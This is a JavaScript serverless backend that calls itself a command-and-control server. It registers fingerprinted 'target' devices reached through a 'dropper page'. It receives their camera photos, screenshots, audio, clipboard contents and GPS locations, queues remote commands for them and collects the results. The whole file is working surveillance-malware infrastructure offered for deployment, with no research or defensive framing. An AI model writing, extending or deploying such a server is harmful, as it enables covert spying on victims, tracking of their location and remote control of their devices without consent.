// ============================================================
//  ULTIMATE C2 BACKEND – Modern UI + All Features
//  Deploy on Vercel
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
} else {
    console.error('Missing Supabase credentials');
}

// ============================================================
//  CORS
// ============================================================
function setCors(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    setCors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;

    console.log(`[${req.method}] ${path}`);

    // ============================================================
    //  ROOT – MODERN LANDING PAGE (with Dashboard button)
    // ============================================================
    if (path === '/') {
        return res.send(`<!DOCTYPE html>
<html>
<head>
    <title>C2 Backend</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:48px 40px;max-width:500px;width:100%;border:1px solid #2a2a44;text-align:center;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
        .icon{font-size:64px;display:block;margin-bottom:12px}
        h1{font-size:28px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
        .sub{color:#8a8aaa;font-size:14px;line-height:1.6;margin-bottom:28px}
        .btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:16px 32px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;cursor:pointer;text-decoration:none;display:inline-block;transition:transform 0.2s,box-shadow 0.2s;box-shadow:0 8px 24px rgba(247,151,30,0.25)}
        .btn:hover{transform:scale(1.02);box-shadow:0 12px 36px rgba(247,151,30,0.35)}
        .btn:active{transform:scale(0.96)}
        .btn-secondary{background:rgba(42,42,68,0.6);border:1px solid rgba(42,42,68,0.4);color:#e0e0e0;box-shadow:none;margin-top:12px}
        .btn-secondary:hover{background:rgba(58,58,90,0.8);border-color:#f7971e;box-shadow:none}
        .endpoints{text-align:left;margin-top:24px;padding:16px;background:rgba(11,11,20,0.5);border-radius:16px;border:1px solid rgba(42,42,68,0.3);font-family:'Courier New',monospace;font-size:12px;color:#4a6a7a;line-height:1.8}
        .endpoints .highlight{color:#88ccff}
        .footer{font-size:11px;color:#4a4a6a;margin-top:20px}
    </style>
</head>
<body>
<div class="card">
    <span class="icon">☠️</span>
    <h1>C2 Backend</h1>
    <p class="sub">Your command & control server is running.</p>

    <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank" class="btn">
        📊 Open Dashboard
    </a>
    <br>
    <a href="/api/test" class="btn btn-secondary">
        🔍 System Status
    </a>

    <div class="endpoints">
        <div><span class="highlight">POST</span> /api/register — Register device</div>
        <div><span class="highlight">POST</span> /api/photo — Upload photo</div>
        <div><span class="highlight">POST</span> /api/upload-file — Upload file (screenshot/audio)</div>
        <div><span class="highlight">POST</span> /api/log — Add log</div>
        <div><span class="highlight">POST</span> /api/location — Add location</div>
        <div><span class="highlight">POST</span> /api/heartbeat — Heartbeat</div>
        <div><span class="highlight">POST</span> /api/update-device — Update device notes</div>
        <div><span class="highlight">GET</span> /api/devices — List devices</div>
        <div><span class="highlight">GET</span> /api/device-details?deviceId=xxx — Full details</div>
        <div><span class="highlight">GET</span> /api/photos?deviceId=xxx — Get photos</div>
        <div><span class="highlight">GET</span> /api/logs?deviceId=xxx — Get logs</div>
        <div><span class="highlight">GET</span> /api/locations?deviceId=xxx — Get locations</div>
        <div><span class="highlight">GET</span> /api/health — JSON health check</div>
        <div><span class="highlight">GET</span> /api/test — HTML status panel</div>
    </div>

    <p class="footer">🔐 Dashboard is password protected.</p>
</div>
</body>
</html>
        `);
    }

    // ============================================================
    //  MODERN STATUS PANEL – /api/test (full HTML)
    // ============================================================
    if (path === '/api/test') {
        // Run health checks
        const results = {
            timestamp: new Date().toISOString(),
            env: {
                supabaseUrl: supabaseUrl ? '✅' : '❌',
                supabaseKey: supabaseKey ? '✅' : '❌'
            },
            supabase: { status: '⏳', error: null, deviceCount: 0 },
            bucket: { exists: false, buckets: [] },
            tables: { devices: '⏳', photos: '⏳', logs: '⏳', locations: '⏳', heartbeats: '⏳', files: '⏳' },
            sample: { count: 0, devices: [] },
            recent: { photo: null, log: null, location: null }
        };

        if (supabase) {
            try {
                const { data, error } = await supabase.from('devices').select('count', { count: 'exact', head: true });
                if (error) { results.supabase.status = '❌'; results.supabase.error = error.message; }
                else { results.supabase.status = '✅'; results.supabase.deviceCount = data?.length || 0; }
            } catch (e) { results.supabase.status = '❌'; results.supabase.error = e.message; }
        } else {
            results.supabase.status = '❌';
            results.supabase.error = 'Missing SUPABASE_URL or SUPABASE_KEY';
        }

        if (supabase && results.supabase.status === '✅') {
            try {
                const { data: buckets } = await supabase.storage.listBuckets();
                results.bucket.buckets = buckets.map(b => b.name);
                results.bucket.exists = buckets.some(b => b.name === 'photos');
            } catch (e) {}
        }

        if (supabase && results.supabase.status === '✅') {
            const tableNames = ['devices', 'photos', 'logs', 'locations', 'heartbeats', 'files'];
            for (const table of tableNames) {
                try {
                    const { error } = await supabase.from(table).select('count', { count: 'exact', head: true });
                    results.tables[table] = error ? '❌' : '✅';
                } catch { results.tables[table] = '❌'; }
            }
        }

        if (supabase && results.supabase.status === '✅') {
            try {
                const { data } = await supabase.from('devices').select('id, ip, platform, last_seen').order('last_seen', { ascending: false }).limit(5);
                results.sample.count = data?.length || 0;
                results.sample.devices = data || [];
            } catch (e) {}
        }

        if (supabase && results.supabase.status === '✅') {
            try {
                const { data: p } = await supabase.from('photos').select('device_id, timestamp').order('timestamp', { ascending: false }).limit(1);
                results.recent.photo = p?.length > 0 ? p[0] : null;
                const { data: l } = await supabase.from('logs').select('device_id, message, timestamp').order('timestamp', { ascending: false }).limit(1);
                results.recent.log = l?.length > 0 ? l[0] : null;
                const { data: loc } = await supabase.from('locations').select('device_id, lat, lon, timestamp').order('timestamp', { ascending: false }).limit(1);
                results.recent.location = loc?.length > 0 ? loc[0] : null;
            } catch (e) {}
        }

        const allGreen = results.supabase.status === '✅' &&
                         results.bucket.exists === true &&
                         Object.values(results.tables).every(v => v === '✅');

        const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Status</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body {
            background: #0a0a12;
            color: #e0e0e0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at 50% 0%, #1a1a2e 0%, #0a0a12 70%);
        }
        .container {
            width: 100%;
            max-width: 900px;
            animation: fadeUp 0.5s ease;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 28px;
            padding: 16px 24px;
            background: rgba(20, 20, 31, 0.5);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            border: 1px solid rgba(42, 42, 68, 0.3);
        }
        .header h1 {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .header h1 span { font-size: 28px; -webkit-text-fill-color: initial; color: #ff3b3b; }
        .header .badge {
            padding: 4px 16px;
            border-radius: 60px;
            font-size: 12px;
            font-weight: 600;
            backdrop-filter: blur(10px);
        }
        .badge.success { background: rgba(26, 42, 26, 0.6); color: #6fcf97; border: 1px solid rgba(42, 74, 42, 0.4); }
        .badge.warning { background: rgba(42, 42, 26, 0.6); color: #ffaa44; border: 1px solid rgba(74, 74, 42, 0.4); }
        .badge.error { background: rgba(42, 26, 26, 0.6); color: #ff5e5e; border: 1px solid rgba(74, 42, 42, 0.4); }
        .badge .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
        .badge .dot.green { background: #6fcf97; }
        .badge .dot.yellow { background: #ffaa44; }
        .badge .dot.red { background: #ff5e5e; }

        .header .time { color: #4a6a7a; font-size: 13px; font-family: 'Courier New', monospace; }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }
        .card {
            background: rgba(20, 20, 31, 0.5);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 18px 20px;
            border: 1px solid rgba(42, 42, 68, 0.3);
            transition: all 0.3s ease;
        }
        .card:hover { border-color: rgba(247, 151, 30, 0.2); transform: translateY(-2px); }
        .card .label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #4a6a7a; margin-bottom: 4px; }
        .card .value { font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .card .value .icon { font-size: 20px; }
        .card .sub { font-size: 12px; color: #4a6a7a; margin-top: 4px; }

        .card-full { grid-column: 1 / -1; }

        .table-wrap {
            overflow-x: auto;
            margin-top: 6px;
        }
        .table-wrap table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        .table-wrap th {
            text-align: left;
            color: #4a6a7a;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 6px 8px;
            border-bottom: 1px solid rgba(42, 42, 68, 0.2);
        }
        .table-wrap td {
            padding: 6px 8px;
            border-bottom: 1px solid rgba(42, 42, 68, 0.1);
            color: #aab;
        }
        .table-wrap td .status-icon { font-size: 16px; }
        .table-wrap tr:hover td { background: rgba(255,255,255,0.02); }

        .footer-text { text-align: center; margin-top: 24px; font-size: 11px; color: #4a4a6a; }
        .footer-text a { color: #88ccff; text-decoration: none; }
        .footer-text a:hover { text-decoration: underline; }
        .code { font-family: 'Courier New', monospace; color: #88ccff; }
        @media (max-width: 600px) {
            .grid { grid-template-columns: 1fr; }
            .header { flex-direction: column; align-items: stretch; text-align: center; }
            .header .time { text-align: center; }
        }
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <h1><span>☠️</span> System Status</h1>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
            <span class="badge ${allGreen ? 'success' : 'warning'}">
                <span class="dot ${allGreen ? 'green' : 'yellow'}"></span>
                ${allGreen ? 'All Systems Ready' : 'Some Issues Detected'}
            </span>
            <span class="time">🕒 ${new Date(results.timestamp).toLocaleString()}</span>
            <a href="/api/test" style="color:#4a6a7a;text-decoration:none;font-size:13px;border:1px solid rgba(42,42,68,0.3);padding:4px 14px;border-radius:60px;">↻ Refresh</a>
        </div>
    </div>

    <div class="grid">
        <div class="card">
            <div class="label">📦 Supabase</div>
            <div class="value">
                <span class="icon">${results.supabase.status === '✅' ? '🟢' : '🔴'}</span>
                ${results.supabase.status === '✅' ? 'Connected' : 'Failed'}
            </div>
            <div class="sub">${results.supabase.deviceCount > 0 ? `${results.supabase.deviceCount} devices registered` : 'No devices yet'}</div>
            ${results.supabase.error ? `<div class="sub" style="color:#ff5e5e;">${results.supabase.error}</div>` : ''}
        </div>

        <div class="card">
            <div class="label">📁 Storage Bucket</div>
            <div class="value">
                <span class="icon">${results.bucket.exists ? '🟢' : '🔴'}</span>
                ${results.bucket.exists ? 'photos ✅' : 'photos ❌'}
            </div>
            <div class="sub">${results.bucket.buckets.length > 0 ? `Buckets: ${results.bucket.buckets.join(', ')}` : 'No buckets found'}</div>
        </div>

        <div class="card">
            <div class="label">📱 Devices</div>
            <div class="value">${results.sample.count}</div>
            <div class="sub">Registered devices</div>
        </div>

        <div class="card">
            <div class="label">⚡ Recent Activity</div>
            <div style="font-size:13px;color:#aab;margin-top:4px;line-height:1.8;">
                ${results.recent.photo ? `📸 ${new Date(results.recent.photo.timestamp).toLocaleTimeString()}` : 'No photos yet'}<br>
                ${results.recent.log ? `📋 ${new Date(results.recent.log.timestamp).toLocaleTimeString()}` : ''}<br>
                ${results.recent.location ? `📍 ${new Date(results.recent.location.timestamp).toLocaleTimeString()}` : ''}
            </div>
        </div>
    </div>

    <div class="card card-full">
        <div class="label">🗄️ Database Tables</div>
        <div class="table-wrap">
            <table>
                <thead><tr><th>Table</th><th>Status</th></tr></thead>
                <tbody>
                    ${Object.entries(results.tables).map(([name, status]) => `
                        <tr>
                            <td><span class="code">${name}</span></td>
                            <td><span class="status-icon">${status === '✅' ? '🟢' : '🔴'}</span> ${status}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    </div>

    <div class="card card-full">
        <div class="label">📋 Recent Devices</div>
        ${results.sample.devices.length > 0 ? `
        <div class="table-wrap">
            <table>
                <thead><tr><th>IP</th><th>Platform</th><th>Last Seen</th></tr></thead>
                <tbody>
                    ${results.sample.devices.map(d => `
                        <tr>
                            <td><span class="code">${d.ip || 'unknown'}</span></td>
                            <td>${d.platform || 'unknown'}</td>
                            <td style="color:#4a6a7a;">${new Date(d.last_seen).toLocaleString()}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
        ` : `<div style="color:#4a6a7a;padding:12px 0;">No devices registered yet. Open the dropper page on a target device.</div>`}
    </div>

    <div class="card card-full">
        <div class="label">🔗 Available Endpoints</div>
        <div style="display:flex;flex-wrap:wrap;gap:4px 16px;padding:8px 0;font-size:13px;color:#4a6a7a;font-family:'Courier New',monospace;">
            <div><span style="color:#88ccff;">POST</span> /api/register</div>
            <div><span style="color:#88ccff;">POST</span> /api/photo</div>
            <div><span style="color:#88ccff;">POST</span> /api/upload-file</div>
            <div><span style="color:#88ccff;">POST</span> /api/log</div>
            <div><span style="color:#88ccff;">POST</span> /api/location</div>
            <div><span style="color:#88ccff;">POST</span> /api/heartbeat</div>
            <div><span style="color:#88ccff;">POST</span> /api/update-device</div>
            <div><span style="color:#6fcf97;">GET</span> /api/devices</div>
            <div><span style="color:#6fcf97;">GET</span> /api/device-details?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/photos?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/logs?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/locations?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/health</div>
            <div><span style="color:#6fcf97;">GET</span> /api/test</div>
        </div>
    </div>

    <div class="footer-text">
        🔐 Dashboard: <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank">Open Admin Panel</a>
        &nbsp;·&nbsp; ⚡ C2 Backend v2.0
    </div>
</div>
</body>
</html>`;

        return res.setHeader('Content-Type', 'text/html; charset=utf-8').status(200).send(html);
    }

    // ============================================================
    //  JSON HEALTH CHECK – /api/health
    // ============================================================
    if (path === '/api/health') {
        return res.json({
            status: 'ok',
            supabase: supabase ? 'connected' : 'not configured',
            env: {
                SUPABASE_URL: supabaseUrl ? 'set' : 'missing',
                SUPABASE_KEY: supabaseKey ? 'set' : 'missing'
            },
            timestamp: new Date().toISOString()
        });
    }

    // ============================================================
    //  REGISTER DEVICE
    // ============================================================
    if (path === '/api/register' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { fingerprint, permissions } = req.body || {};
        if (!fingerprint) return res.status(400).json({ error: 'Missing fingerprint' });
        const deviceId = fingerprint.deviceId || 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        const { error } = await supabase.from('devices').upsert([{
            id: deviceId,
            ip: fingerprint.ip || 'unknown',
            platform: fingerprint.platform || 'unknown',
            screen: fingerprint.screen || 'unknown',
            timezone: fingerprint.timezone || 'unknown',
            cpu_cores: fingerprint.cpuCores || 'unknown',
            memory: fingerprint.deviceMemory || 'unknown',
            canvas_fp: fingerprint.canvasFingerprint || 'unknown',
            first_seen: Date.now(),
            last_seen: Date.now(),
            permissions: JSON.stringify(permissions || {}),
            notes: ''
        }], { onConflict: 'id' });
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('logs').insert([{ device_id: deviceId, level: 'info', message: 'Device registered/updated', timestamp: Date.now() }]);
        return res.json({ success: true, deviceId });
    }

    // ============================================================
    //  UPDATE DEVICE (notes)
    // ============================================================
    if (path === '/api/update-device' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, notes } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { error } = await supabase.from('devices').update({ notes }).eq('id', deviceId);
        if (error) return res.status(500).json({ error: error.message });
        return res.json({ success: true });
    }

    // ============================================================
    //  UPLOAD PHOTO
    // ============================================================
    if (path === '/api/photo' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, image, timestamp, camera } = req.body || {};
        if (!deviceId || !image) return res.status(400).json({ error: 'Missing deviceId or image' });
        try {
            let storagePath = null, filePath = null;
            try {
                const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
                const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
                const fileName = `${deviceId}_${Date.now()}_${camera || 'back'}.${ext}`;
                const { error: uploadError } = await supabase.storage.from('photos').upload(fileName, Buffer.from(base64Data, 'base64'), { contentType: `image/${ext}`, cacheControl: '3600' });
                if (!uploadError) { storagePath = fileName; const { data: urlData } = supabase.storage.from('photos').getPublicUrl(fileName); filePath = urlData?.publicUrl || null; }
            } catch (e) { console.error('Storage error:', e); }
            const { error: dbError } = await supabase.from('photos').insert([{ device_id: deviceId, timestamp: timestamp || Date.now(), data_url: storagePath ? null : image.substring(0, 100), storage_path: storagePath, file_path: filePath, camera: camera || 'back' }]);
            if (dbError) return res.status(500).json({ error: dbError.message });
            await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
            return res.json({ success: true, storagePath, filePath });
        } catch (e) { return res.status(500).json({ error: e.message }); }
    }

    // ============================================================
    //  UPLOAD FILE (screenshot, audio, clipboard)
    // ============================================================
    if (path === '/api/upload-file' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, fileType, content, dataUrl, timestamp } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        let fileUrl = null, storagePath = null;
        if (dataUrl && dataUrl.startsWith('data:')) {
            try {
                const base64Data = dataUrl.replace(/^data:audio\/\w+;base64,/, '').replace(/^data:image\/\w+;base64,/, '');
                const ext = dataUrl.match(/^data:(image|audio)\/(\w+);/)?.[2] || 'bin';
                const fileName = `${deviceId}_${Date.now()}.${ext}`;
                const { error: uploadError } = await supabase.storage.from('files').upload(fileName, Buffer.from(base64Data, 'base64'), { contentType: dataUrl.match(/^data:(image|audio)\/(\w+);/)?.[0] || 'application/octet-stream', cacheControl: '3600' });
                if (!uploadError) { storagePath = fileName; const { data: urlData } = supabase.storage.from('files').getPublicUrl(fileName); fileUrl = urlData?.publicUrl || null; }
            } catch (e) { console.error('File storage error:', e); }
        }

        const { error: dbError } = await supabase.from('files').insert([{
            device_id: deviceId,
            file_type: fileType || 'unknown',
            file_url: fileUrl,
            storage_path: storagePath,
            content: content || null,
            timestamp: timestamp || Date.now()
        }]);
        if (dbError) return res.status(500).json({ error: dbError.message });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true, fileUrl, storagePath });
    }

    // ============================================================
    //  LOG
    // ============================================================
    if (path === '/api/log' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, msg, level } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { error } = await supabase.from('logs').insert([{ device_id: deviceId, timestamp: Date.now(), level: level || 'info', message: msg || '' }]);
        if (error) return res.status(500).json({ error: error.message });
        return res.json({ success: true });
    }

    // ============================================================
    //  LOCATION
    // ============================================================
    if (path === '/api/location' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, lat, lon, timestamp } = req.body || {};
        if (!deviceId || lat === undefined || lon === undefined) return res.status(400).json({ error: 'Missing fields' });
        const { error } = await supabase.from('locations').insert([{ device_id: deviceId, timestamp: timestamp || Date.now(), lat, lon }]);
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  HEARTBEAT
    // ============================================================
    if (path === '/api/heartbeat' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  GET DEVICES
    // ============================================================
    if (path === '/api/devices' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { data, error } = await supabase.from('devices').select('*').order('first_seen', { ascending: false });
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  GET DEVICE DETAILS
    // ============================================================
    if (path === '/api/device-details' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const [commands, results, logs, photos, files, locations] = await Promise.all([
            supabase.from('commands').select('*').eq('device_id', deviceId).order('sent_at', { ascending: false }).limit(50),
            supabase.from('results').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(50),
            supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100),
            supabase.from('photos').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20),
            supabase.from('files').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20),
            supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100)
        ]);
        return res.json({
            commands: commands.data || [],
            results: results.data || [],
            logs: logs.data || [],
            photos: photos.data || [],
            files: files.data || [],
            locations: locations.data || []
        });
    }

    // ============================================================
    //  GET PHOTOS
    // ============================================================
    if (path === '/api/photos' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('photos').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false });
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data.map(p => { if (p.storage_path) { const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path); return { ...p, publicUrl: urlData?.publicUrl || null }; } return p; }));
    }

    // ============================================================
    //  GET LOGS
    // ============================================================
    if (path === '/api/logs' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(200);
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  GET LOCATIONS
    // ============================================================
    if (path === '/api/locations' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100);
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  GET COMMANDS (for device polling)
    // ============================================================
    if (path === '/api/commands' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('commands').select('*').eq('device_id', deviceId).eq('status', 'pending').order('sent_at', { ascending: true }).limit(10);
        if (error) return res.status(500).json({ error: error.message });
        if (data && data.length > 0) await supabase.from('commands').update({ status: 'sent' }).in('id', data.map(c => c.id));
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json(data || []);
    }

    // ============================================================
    //  SEND COMMAND
    // ============================================================
    if (path === '/api/send-command' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, command } = req.body || {};
        if (!deviceId || !command) return res.status(400).json({ error: 'Missing deviceId or command' });
        const { data, error } = await supabase.from('commands').insert([{ device_id: deviceId, command, sent_at: Date.now(), status: 'pending' }]).select();
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('logs').insert([{ device_id: deviceId, level: 'info', message: `Command sent: ${command}`, timestamp: Date.now() }]);
        return res.json({ success: true, commandId: data[0].id });
    }

    // ============================================================
    //  SUBMIT COMMAND RESULT
    // ============================================================
    if (path === '/api/submit-result' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, commandId, output, error: cmdError } = req.body || {};
        if (!deviceId || !commandId) return res.status(400).json({ error: 'Missing deviceId or commandId' });
        await supabase.from('commands').update({ status: cmdError ? 'failed' : 'executed', executed_at: Date.now() }).eq('id', commandId);
        await supabase.from('results').insert([{ device_id: deviceId, command_id: commandId, output: output || '', error: cmdError || '', timestamp: Date.now() }]);
        await supabase.from('logs').insert([{ device_id: deviceId, level: cmdError ? 'error' : 'info', message: cmdError ? `Command failed: ${cmdError}` : 'Command executed successfully', timestamp: Date.now() }]);
        return res.json({ success: true });
    }

    // ============================================================
    //  DELETE DEVICE
    // ============================================================
    if (path === '/api/delete-device' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        await supabase.from('devices').delete().eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  404
    // ============================================================
    return res.status(404).json({ error: 'Not Found', path });
};
